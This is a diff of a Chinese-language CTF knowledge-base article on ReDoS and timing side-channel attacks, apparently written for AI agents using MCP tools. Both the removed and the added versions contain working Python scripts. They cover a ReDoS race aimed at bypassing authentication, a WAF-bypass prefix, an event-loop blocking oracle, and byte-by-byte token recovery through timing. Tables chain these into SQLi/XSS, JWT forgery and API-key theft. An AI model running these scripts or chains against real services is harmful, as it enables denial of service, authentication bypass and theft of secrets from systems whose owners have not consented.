@@ -3,191 +3,228 @@ id: "ctf-website/03-injection/redos-timing"
 title: "ReDoS & 时序攻击"
 title_en: "ReDoS and Timing Attacks"
 summary: >
-  介绍正则表达式拒绝服务 (ReDoS) 和时序侧信道攻击两大技术。ReDoS 利用灾难性回溯实现 Node.js 事件循环阻塞导致认证绕过和 WAF 超时穿透；时序攻击通过非恒定时间比较的统计测量实现 Token/密钥逐字节恢复。
+  ReDoS/Timing 的难点是把网络抖动、排队、缓存、限速与真正的正则回溯或非恒定时间比较分开。本篇给出正则输入增长曲线、并发事件循环 oracle、WAF 超时分叉、逐字节 timing 统计、trimmed mean/median 判定、成功/失败样本和 Evidence 模板。
 summary_en: >
-  Two techniques: Regular Expression Denial of Service (ReDoS) exploiting catastrophic backtracking for Node.js event loop blocking, auth bypass, and WAF timeout penetration; and timing side-channel attacks recovering tokens/keys byte-by-byte via statistical measurement of non-constant-time comparisons.
+  ReDoS/Timing work requires separating network jitter, queueing, cache, and throttling from real regex backtracking or non-constant-time comparison. Includes growth curves, event-loop oracles, WAF timeout branches, byte-wise timing statistics, trimmed mean/median decisions, success/failure samples, and evidence templates.
 board: "ctf-website"
 category: "03-injection"
-signals: ["ReDoS", "正则回溯", "catastrophic backtracking", "时序攻击", "timing attack", "WAF超时", "event loop"]
+signals: ["ReDoS", "正则回溯", "catastrophic backtracking", "时序攻击", "timing attack", "WAF超时", "event loop", "side channel"]
 mcp_tools: ["http_probe", "kb_router"]
-keywords: ["ReDoS", "正则攻击", "时序攻击", "timing attack", "WAF绕过", "正则回溯", "侧信道"]
+keywords: ["ReDoS", "正则攻击", "时序攻击", "timing attack", "WAF绕过", "正则回溯", "侧信道", "event loop"]
 difficulty: "advanced"
-tags: ["injection", "redos", "timing-attack", "dos", "web-security", "side-channel", "ctf"]
+tags: ["injection", "redos", "timing-attack", "side-channel", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: []
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/16-rate-limit/02-brute-force-tactics", "ctf-website/08-infra/http2-attacks"]
 ---
 
 # ReDoS & 时序攻击
 
-## Catastrophic Backtracking (ReDoS)
+ReDoS 是算法复杂度输入，Timing 是响应时间侧信道。两者都不能凭一次慢响应下结论，必须建立 baseline、增长曲线、样本分布和失败样本。
 
-```python
-# 恶意正则构造 — 指数级回溯
-EVIL_REGEX_PATTERNS = {
-    # 模式 A: (a+)+$ — 嵌套量词
-    # "aaaaaaaaaaaaaaaaaaaa!"  → 回溯 2^n 次
-    "nested_plus": r"(a+)+$",
-    "nested_star": r"(a*)*$",
-    "alt_group": r"(a|aa)+$",
-    "group_ref": r"(\w+)=(\w+)*",
+## 输入信号
 
-    # 模式 B: 实际 WAF/库中的 ReDoS 漏洞
-    "email_validation": r"^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,}|[0-9]{1,3})(\]?)$",
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 输入被正则验证 | 递增长度曲线 | 长度线性增加，耗时指数/超线性增长 | 所有长度耗时随机跳动 |
+| Node/单线程服务 | 并发 trigger + probe | trigger 时普通 probe 延迟同步升高 | 只有 trigger 自己慢 |
+| WAF 复杂规则 | prefix 触发回溯 + payload 后缀 | WAF 错误/超时后业务处理推进 | WAF 统一 403 |
+| token/API key 比较 | 多样本逐字符 timing | 正确前缀均值/中位数稳定偏高 | 差异小于噪声 |
+| rate limit/queue | 交错 baseline/control | control 与 candidate 同时慢 | 排队/限速，不是侧信道 |
 
-    # 模式 C: 路径匹配 — Nginx/Apache rewrite rules
-    "path_rewrite": r"^(/[^/]+)+\/?$",
-}
+## 工作流
+
+```text
+建立 baseline 和 control 输入
+  → 长度/前缀单变量增长
+  → 多轮采样并裁剪异常值
+  → 对比 trigger 与 probe 是否相关
+  → 只在稳定差异时推进利用链
+  → 记录分布、阈值、失败样本
 ```
 
-## ReDoS → Auth Bypass (Node.js)
+## 0. ReDoS 增长曲线
 
 ```python
-# Node.js 单线程 event loop → ReDoS 阻塞整个进程
-# 在认证检查卡住时，并发发送未认证请求 → 可能通过
+#!/usr/bin/env python3
+import argparse
+import json
+import statistics
+import time
+import requests
 
-import concurrent.futures, requests, time
+def measure(url, param, value, samples):
+    out = []
+    for _ in range(samples):
+        t0 = time.perf_counter()
+        r = requests.get(url, params={param: value}, timeout=30)
+        out.append((time.perf_counter() - t0) * 1000)
+    xs = sorted(out)
+    trim = xs[1:-1] if len(xs) > 4 else xs
+    return {"status": r.status_code, "mean_ms": statistics.mean(trim), "median_ms": statistics.median(trim), "min_ms": min(xs), "max_ms": max(xs)}
 
-def redos_auth_bypass(target: str, evil_input: str):
-    """利用 ReDoS 卡住认证检查，并发发送未认证请求"""
-    results = []
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--param", required=True)
+    ap.add_argument("--char", default="a")
+    ap.add_argument("--suffix", default="!")
+    ap.add_argument("--start", type=int, default=8)
+    ap.add_argument("--stop", type=int, default=28)
+    ap.add_argument("--step", type=int, default=4)
+    ap.add_argument("--samples", type=int, default=5)
+    args = ap.parse_args()
+    for n in range(args.start, args.stop + 1, args.step):
+        value = args.char * n + args.suffix
+        print(json.dumps({"n": n, "result": measure(args.url, args.param, value, args.samples)}, ensure_ascii=False))
 
-    def send_unauthorized():
-        r = requests.get(f"{target}/admin/flag",
-            headers={"Authorization": "Bearer invalid"})
-        return ("unauth", r.status_code, r.text[:50])
-
-    def trigger_redos():
-        # 提交触发 ReDoS 的输入
-        r = requests.post(f"{target}/api/validate", json={
-            "email": evil_input   # 触发正则回溯
-        })
-        return ("redos", r.status_code, r.text[:50])
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
-        # 先发 5 个 ReDoS 请求
-        futures = [ex.submit(trigger_redos) for _ in range(5)]
-        # 同时发 25 个未认证请求
-        futures += [ex.submit(send_unauthorized) for _ in range(25)]
-
-        for f in concurrent.futures.as_completed(futures):
-            label, status, body = f.result()
-            if label == "unauth" and status == 200:
-                print(f"[!] AUTH BYPASS via ReDoS race!")
-            results.append((label, status))
-    return results
+if __name__ == "__main__":
+    main()
 ```
 
-## ReDoS → WAF 绕过
+成功样本：`n` 增长时 median 呈明显超线性增长，并且 control 输入不随之增长。失败样本：所有输入一起变慢，通常是网络、限速或排队。
+
+## 1. 正则族与输入模板
+
+| 正则族 | 输入模板 | 观察点 |
+|---|---|---|
+| `(a+)+$` | `a^n + !` | 嵌套量词回溯 |
+| `(a|aa)+$` | `a^n + !` | 分支回溯 |
+| `([a-z]+)*$` | `a^n + !` | group + star |
+| 路径 rewrite | `/a/a/.../!` | 路由层耗时 |
+| email/url validator | 长 local/domain + 破坏后缀 | 注册/搜索/导入接口 |
+
+## 2. 事件循环 oracle
 
 ```python
-# WAF 在其正则引擎中检查 payload → 触发 ReDoS → WAF timeout → pass through
+#!/usr/bin/env python3
+import argparse
+import concurrent.futures
+import json
+import time
+import requests
 
-def waf_redos_bypass(waf_target: str, payload: str):
-    """发送使 WAF 正则卡死的 payload"""
-    # 在正常攻击 payload 前附加 ReDoS 触发器
-    # 使 WAF 在到达真正的攻击 payload 前就超时
-    redos_prefix = "A" * 100 + "!"
-    # WAF 正则: /^[a-zA-Z0-9 ]+$/
-    # 输入: AAAA...!  → 回溯 → 超时 → WAF skip
+def hit(method, url, **kwargs):
+    t0 = time.perf_counter()
+    r = requests.request(method, url, timeout=30, **kwargs)
+    return {"status": r.status_code, "ms": round((time.perf_counter() - t0) * 1000, 2), "sample": r.text[:120]}
 
-    r = requests.post(waf_target, data={
-        "input": redos_prefix + payload
-    })
-    return r
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--trigger-url", required=True)
+    ap.add_argument("--probe-url", required=True)
+    ap.add_argument("--param", required=True)
+    ap.add_argument("--evil", required=True)
+    ap.add_argument("--workers", type=int, default=12)
+    args = ap.parse_args()
+    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
+        futs = []
+        for _ in range(args.workers // 3):
+            futs.append(("trigger", ex.submit(hit, "GET", args.trigger_url, params={args.param: args.evil})))
+        for _ in range(args.workers):
+            futs.append(("probe", ex.submit(hit, "GET", args.probe_url)))
+        for label, f in futs:
+            try:
+                print(json.dumps({"type": label, **f.result()}, ensure_ascii=False))
+            except Exception as e:
+                print(json.dumps({"type": label, "error": str(e)}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-## 时序攻击 — Token/Key 逐字节恢复
+命中判断：trigger 慢的同时 probe 也稳定慢，说明共享 event loop / worker pool 被卡住；只有 trigger 慢通常只是局部正则耗时。
+
+## 3. Timing 逐字符统计
 
 ```python
-# 非恒定时间比较 → 逐字节泄露
-import time, statistics
+#!/usr/bin/env python3
+import argparse
+import json
+import statistics
+import string
+import time
+import requests
 
-def timing_attack_byte(target_url: str, known_prefix: str,
-                       charset: str = "abcdefghijklmnopqrstuvwxyz0123456789",
-                       samples: int = 30):
-    """统计时序攻击恢复下一个字节"""
-    times = {}
+def sample(url, param, value, samples):
+    xs = []
+    for _ in range(samples):
+        t0 = time.perf_counter()
+        requests.get(url, params={param: value}, timeout=10)
+        xs.append((time.perf_counter() - t0) * 1_000_000)
+    xs.sort()
+    trim = xs[2:-2] if len(xs) > 8 else xs
+    return {"mean": statistics.mean(trim), "median": statistics.median(trim), "stdev": statistics.pstdev(trim), "n": len(trim)}
 
-    for ch in charset:
-        test = known_prefix + ch
-        measurements = []
-        for _ in range(samples):
-            start = time.perf_counter()
-            r = requests.get(target_url, params={"token": test})
-            end = time.perf_counter()
-            measurements.append((end - start) * 1_000_000)  # 微秒
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--param", default="token")
+    ap.add_argument("--prefix", default="")
+    ap.add_argument("--charset", default=string.ascii_lowercase + string.digits)
+    ap.add_argument("--samples", type=int, default=20)
+    args = ap.parse_args()
+    rows = []
+    for ch in args.charset:
+        value = args.prefix + ch
+        stat = sample(args.url, args.param, value, args.samples)
+        rows.append({"ch": ch, **stat})
+    rows.sort(key=lambda x: x["median"], reverse=True)
+    print(json.dumps({"prefix": args.prefix, "top": rows[:8], "all": rows}, ensure_ascii=False))
 
-        # 去掉明显异常值
-        measurements.sort()
-        trimmed = measurements[3:-3]  # 去掉最高/最低 3 个
-        times[ch] = statistics.mean(trimmed)
-
-    # 正确的字节应该多一次比较 → 略慢
-    # 找出显著慢的
-    baseline = statistics.median(list(times.values()))
-    for ch, t in times.items():
-        if t > baseline * 1.5:  # 50% 以上的差异
-            print(f"[!] Next byte: {ch} ({t:.1f}μs vs baseline {baseline:.1f}μs)")
-            return ch
-    return None
-
-# 使用:
-# known = ""
-# for i in range(32):
-#     next_byte = timing_attack_byte("https://target.com/verify", known)
-#     if next_byte:
-#         known += next_byte
-#     else:
-#         break
-# print(f"Recovered token: {known}")
+if __name__ == "__main__":
+    main()
 ```
 
-## JWT HS256 Key 时序泄露
+判定矩阵：
 
-```python
-# Go 的 == 操作符在 JWT library 中非恒定时间比较 iss/aud
-# → 可泄露 trusted issuer URL
-# 类似: Node.js crypto.timingSafeEqual 未使用时
+| 现象 | 解释 | 下一步 |
+|---|---|---|
+| top1 多轮一致且差距 > stdev | 可能存在前缀比较 | 扩展下一位 |
+| top 候选轮换 | 噪声覆盖 | 增加样本、换时间窗口 |
+| 所有候选一起慢 | 限速/排队 | 加 control，不推进 |
+| 正确长度突然固定慢 | 长度先验泄露 | 先恢复长度 |
 
-def jwt_claim_timing_leak(token: str, target: str):
-    """探测 JWT iss claim 的 trust list"""
-    candidates = [
-        "https://auth.google.com",
-        "https://auth.target.com",
-        "https://sso.internal",
-        "https://okta.target.com",
-    ]
-    for iss in candidates:
-        # 修改 token 中的 iss claim
-        import jwt as pyjwt
-        payload = pyjwt.decode(token, options={"verify_signature": False})
-        payload["iss"] = iss
-        # 用空 key 签名 + 发送
-        # 正确 iss 的处理时间 vs 错误 iss 的处理时间有差异
-        ...
-```
+## 4. WAF timeout 分叉
+
+| 变体 | 操作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| redos prefix | 复杂输入 + benign payload | WAF 超时或业务响应推进 | 统一 403 |
+| payload before prefix | payload + 复杂输入 | WAF 先拦截 | 顺序无差异 |
+| control prefix | 同长度简单输入 | 不慢 | control 同样慢 |
+| 并发 trigger | 多个慢输入 | 后续请求排队 | 单请求局部慢 |
 
 ## 攻击链
 
-```
-ReDoS → Node.js event loop 阻塞 → Auth bypass → Admin API
-ReDoS → WAF timeout → SQLi/XSS payload pass through → RCE
-Timing attack → CSRF token byte-by-byte → 完整 token → CSRF 攻击
-Timing attack → HMAC key → JWT 伪造 → 任意用户
-Timing attack → API key → cloud 资源访问 → 数据泄露
+```text
+ReDoS
+  → 正则增长曲线命中
+  → 事件循环/网关/WAF 分叉
+  → 认证、过滤、队列或缓存行为差异
+  → 转 SQLi/XSS/API/业务动作
+
+Timing
+  → baseline/control 样本
+  → 逐字符候选统计
+  → token/secret/issuer 前缀恢复
+  → 转 CSRF/JWT/API key 链
 ```
 
 ## Evidence
 
-记录: 每字节采样时间分布 (均值/标准差/样本数)、ReDoS 触发时的事件循环阻塞时间、WAF 绕过证明
+| 项 | 记录内容 |
+|---|---|
+| baseline | control 输入、样本数、均值/中位数/stdev |
+| ReDoS 曲线 | 长度、payload、每档耗时、状态码、响应 hash |
+| 并发 oracle | trigger/probe 时间相关性、worker 数、失败请求 |
+| Timing 统计 | prefix、charset、top 候选、多轮稳定性 |
+| 成功样本 | 稳定耗时差异导致 token/状态/过滤/flag 推进 |
+| 失败样本 | 排队、限速、缓存、网络抖动、所有候选同分布 |
+| 下一跳 | WAF 分叉转具体注入；token 转 CSRF/JWT；DoS 维度转 22-dos |
 
 ## MCP 工具映射
 
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| ReDoS 探测 | `http_probe` | 发送正则炸弹 payload |
-| 按信号查技术 | `kb_router` | 搜索 redos 相关技术文件 |
-
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 时延探测 | `http_probe` | 固定输入长度和响应时间采样 |
+| 知识路由 | `kb_router` | 按 redos、timing、side channel、event loop 搜索 |
